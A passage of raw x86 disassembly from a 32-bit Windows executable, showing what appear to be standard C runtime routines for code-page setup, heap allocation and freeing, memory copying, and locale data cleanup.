  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
